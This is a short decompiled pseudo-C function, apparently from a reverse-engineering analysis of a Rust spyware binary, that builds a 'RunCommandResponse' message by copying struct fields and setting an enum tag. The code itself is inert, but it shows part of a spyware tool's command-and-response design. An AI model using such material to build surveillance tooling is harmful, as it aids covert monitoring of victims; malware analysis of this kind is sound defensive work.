
  int64_t spyware::communication::messages::Message::RunCommandResponse::h87f1971d57af5fa1(int64_t* arg1, int128_t* arg2)

{
    int64_t result = arg2[3];
    arg1[7] = result;
    int128_t zmm0 = *arg2;
    int128_t zmm1 = arg2[1];
    *(arg1 + 0x28) = arg2[2];
    *(arg1 + 0x18) = zmm1;
    *(arg1 + 8) = zmm0;
    *arg1 = -0x7fffffffffffffff;
    return result;
}
